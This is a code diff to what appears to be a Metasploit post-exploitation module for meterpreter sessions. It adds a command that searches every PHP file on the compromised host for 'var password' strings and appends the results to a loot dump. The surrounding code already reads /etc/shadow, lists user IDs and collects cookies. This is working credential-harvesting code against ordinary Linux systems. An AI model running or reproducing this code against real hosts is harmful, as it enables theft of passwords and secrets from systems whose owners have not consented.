@@ -186,8 +186,8 @@ def run
     #
     if not sysinfo.nil?
       print_good("Running module against: #{sys_info['Computer']}")
+      print_warning("Be Patience, this may take up to 40 sec to finish ..")
       Rex::sleep(0.5)
-      print_warning("  ::Be::Patience:: this may take up to 40 sec to finish ..")
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
@@ -411,6 +411,8 @@ def run
           etc_shadow = cmd_exec("cat /etc/shadow")
           # list all uid/guid id's/info
           uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
+          # find php var password strings
+          php_passwd = cmd_exec("find / -name \"*.php\" -print0 | xargs -0 grep -i -n \"var password\"")
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -440,6 +442,10 @@ def run
             data_dump << "ETC/SHADOW FILE:\n"
             data_dump << "----------------\n"
             data_dump << etc_shadow
+            data_dump << "\n\n"
+            data_dump << "PHP PASSWORDS:\n"
+            data_dump << "--------------\n"
+            data_dump << php_passwd
             data_dump << "\n\n"
             data_dump << "LISTING COOKIES :\n"
             data_dump << "-----------------\n"
